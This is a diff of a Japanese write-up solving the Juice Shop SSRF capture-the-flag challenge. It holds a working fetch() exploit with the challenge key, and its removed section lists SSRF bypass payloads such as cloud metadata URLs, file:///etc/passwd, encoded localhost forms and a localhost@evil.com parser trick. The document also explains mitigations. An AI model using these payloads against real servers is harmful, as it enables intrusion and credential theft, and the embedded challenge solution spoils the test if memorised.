@@ -1,146 +1,136 @@
-# SSRF ❌
+# SSRF (Server-Side Request Forgery) ✅
 
 **難易度:** ⭐⭐⭐⭐⭐⭐
-**カテゴリ:** SSRF (Server-Side Request Forgery)
-**目標:** サーバーを騙して内部リソースにアクセスさせる
-
----
+**カテゴリ:** Broken Access Control
+**目標:** サーバーを経由して隠しリソースにリクエストを送る
 
 ## 思考プロセス
 
-**ステップ1: SSRF の基本を理解**
-```
-「SSRF = サーバー側リクエスト偽造」
-    ↓
-「ユーザーがURLを指定 → サーバーがそのURLにアクセス」
-    ↓
-「内部ネットワークのURLを指定したら？」
-    ↓
-「サーバーが内部リソースにアクセスしてしまう」
-```
+### 1. SSRF の脆弱性箇所を特定
 
-**ステップ2: SSRF 可能な機能を探す**
-```
-「URLを入力できる機能を探す」
-    ↓
-「プロフィール画像のURL指定機能」
-    ↓
-「サーバーが画像をフェッチする → SSRF の可能性」
-```
+プロフィール画像のURL設定機能が SSRF に脆弱:
+- `/profile/image/url` エンドポイント
+- `imageUrl` パラメータがサーバー側でフェッチされる
+- 入力検証なしで内部リソースにアクセス可能
 
-**ステップ3: 攻撃シナリオ**
-```
-「プロフィール画像URLに内部URLを指定」
-    ↓
-「http://localhost:3000/internal/... など」
-    ↓
-「サーバーが自身にリクエスト → 内部APIにアクセス」
-    ↓
-「通常アクセスできないエンドポイントに到達」
-```
+### 2. 隠しリソースの発見
 
-## SSRF の危険性
-
-1. **内部ネットワークへのアクセス**
-   - ファイアウォールをバイパス
-   - 内部サービス (Redis, Elasticsearch) への攻撃
-
-2. **クラウドメタデータの取得**
-   - AWS: `http://169.254.169.254/latest/meta-data/`
-   - GCP: `http://metadata.google.internal/`
-
-3. **ローカルファイルの読み取り**
-   - `file:///etc/passwd`
-
-## 攻撃対象エンドポイント
+FTP の quarantine フォルダにあるマルウェアファイルを解析すると、隠しエンドポイントが判明:
 
 ```
-/profile/image/url  - プロフィール画像URL
-/api/Products/{id}  - 商品画像URL
+http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
 ```
+
+### 3. SSRF の実行
+
+プロフィール画像URLとして隠しエンドポイントを設定すると、サーバーが内部リクエストを実行。
 
 ## 実行手順
 
-1. **プロフィール画像URL機能を確認**
-   ```javascript
-   // プロフィールページで URL を入力できるか確認
-   // Network タブでリクエストを観察
-   ```
+### 方法: API 直接呼び出し
 
-2. **内部URLへのアクセスを試行**
-   ```javascript
-   // ログイン後に実行
-   fetch('/profile/image/url', {
-     method: 'POST',
-     headers: {
-       'Content-Type': 'application/json',
-       'Authorization': 'Bearer ' + localStorage.getItem('token')
-     },
-     body: JSON.stringify({
-       imageUrl: 'http://localhost:3000/api/Challenges'
-     })
-   }).then(r => r.text()).then(console.log);
-   ```
+```javascript
+// browser_evaluate を使用
+async () => {
+  const token = localStorage.getItem('token');
 
-3. **様々なURLを試す**
-   ```
-   # localhost の別表記
-   http://127.0.0.1:3000/...
-   http://[::1]:3000/...
-   http://localhost.localdomain:3000/...
-   
-   # IP アドレスの変換
-   http://2130706433:3000/...     # 127.0.0.1 の decimal 表記
-   http://0x7f000001:3000/...     # hex 表記
-   http://0177.0.0.1:3000/...     # octal 表記
-   
-   # DNS rebinding
-   http://localtest.me:3000/...   # 127.0.0.1 を返すドメイン
-   
-   # File スキーム
-   file:///etc/passwd
-   ```
+  // フォームデータを作成
+  const formData = new URLSearchParams();
+  formData.append('imageUrl', 'http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3');
 
-4. **チャレンジ特有のエンドポイント**
-   ```
-   # SSRF チャレンジの完了条件（推測）
-   http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_444_u
-   ```
+  // SSRF ペイロードをプロフィール画像URLとして送信
+  const response = await fetch('/profile/image/url', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Authorization': 'Bearer ' + token
+    },
+    body: formData.toString()
+  });
 
-## バイパステクニック
-
-### URL パース の違いを利用
-```
-http://localhost:3000@evil.com/  → evil.com にアクセス（一部のパーサー）
-http://localhost:3000#@evil.com/ → localhost にアクセス（別のパーサー）
+  return { status: response.status };
+}
+// 結果: { status: 200 }
 ```
 
-### オープンリダイレクト との組み合わせ
-```
-1. 許可されたURL: http://allowed.com/redirect?url=http://localhost/
-2. サーバーが allowed.com にアクセス
-3. リダイレクトで localhost にアクセス
-```
+## コード/ペイロード
 
-## 検証ポイント
-
-- [ ] プロフィール画像URL機能を確認
-- [ ] 内部URLが拒否されるか確認
-- [ ] バイパステクニックを試行
-- [ ] チャレンジ完了条件を満たす
-
-## 対策
-
-- URL のホワイトリスト検証
-- プライベート IP アドレスの拒否
-- リダイレクト先の検証
-- 外部リクエストをプロキシ経由に
-
-## 関連チャレンジ
-
-- [Allowlist Bypass](../difficulty-4/allowlist-bypass.md)
-- [XXE Data Access](../difficulty-3/xxe-data-access.md)
+| 項目 | 値 |
+|------|-----|
+| Endpoint | `/profile/image/url` |
+| Method | POST |
+| Payload | `imageUrl=http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3` |
 
 ## 解説
 
-[未着手]
+### SSRF とは何か？
+
+SSRF は「サーバーに代わりにリクエストを送らせる攻撃」。
+
+**日常的な例えで説明すると:**
+
+会社のオフィス（サーバー）に電話して「この住所に荷物を届けて」と頼む状況を想像してください。
+
+- 通常: 「〇〇商店に届けて」→ 外部への配達（問題なし）
+- SSRF: 「あなたの会社の金庫室に届けて」→ 内部への配達（本来アクセスできない場所）
+
+サーバーは「社員」なので社内（localhost）に自由にアクセスできる。攻撃者はその権限を借りて、外部からはアクセスできない内部リソースに到達する。
+
+### なぜこの攻撃が成立するのか？
+
+```
+┌─────────────────────────────────────────────────────┐
+│                  インターネット                      │
+│    ┌─────────┐                                      │
+│    │ 攻撃者  │                                      │
+│    └────┬────┘                                      │
+│         │ ① 「http://localhost:3000/secret を取得して」│
+│         ▼                                           │
+├─────────────────────────────────────────────────────┤
+│        ファイアウォール (外部→内部をブロック)         │
+├─────────────────────────────────────────────────────┤
+│                  内部ネットワーク                    │
+│    ┌─────────┐      ② サーバーが      ┌──────────┐ │
+│    │  Web    │ ───────────────────▶   │ 隠しAPI  │ │
+│    │ サーバー │    内部リクエスト実行   │ /secret  │ │
+│    └─────────┘                        └──────────┘ │
+│         │                                          │
+│         │ ③ 結果を攻撃者に返す                      │
+│         ▼                                          │
+└─────────────────────────────────────────────────────┘
+```
+
+**ポイント:**
+1. 攻撃者は直接 `localhost:3000` にアクセスできない（ファイアウォールでブロック）
+2. しかし、サーバーに「このURLを取得して」と頼める機能がある
+3. サーバーは自分自身（localhost）には自由にアクセスできる
+4. 結果として、攻撃者は「サーバーの権限を借りて」内部にアクセスできる
+
+### このチャレンジの具体的な流れ
+
+```
+1. 攻撃者: 「プロフィール画像を http://localhost:3000/solve/... から取得して」
+2. サーバー: 「了解、そのURLを取得します」
+3. サーバー: fetch("http://localhost:3000/solve/...") を実行
+4. 隠しAPI: サーバーからのリクエストなので応答（チャレンジ解決）
+5. 攻撃者: 内部APIを実行させることに成功
+```
+
+### 根本原因
+
+**「誰のためのリクエストか」を区別していない**
+
+サーバーは自分の権限で URL を取得するが、それは「ユーザーのため」の操作。しかし、どの URL にアクセスして良いかの判断がない。
+
+### 対策
+
+| 対策 | 説明 |
+|------|------|
+| **ホワイトリスト** | 許可された外部ドメインのみ取得可能にする |
+| **localhost 禁止** | 127.0.0.1, localhost, ::1 をブロック |
+| **プライベートIP禁止** | 10.x.x.x, 192.168.x.x 等をブロック |
+| **DNS再バインディング対策** | 解決後のIPアドレスも検証 |
+
+## 参考リンク
+
+- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
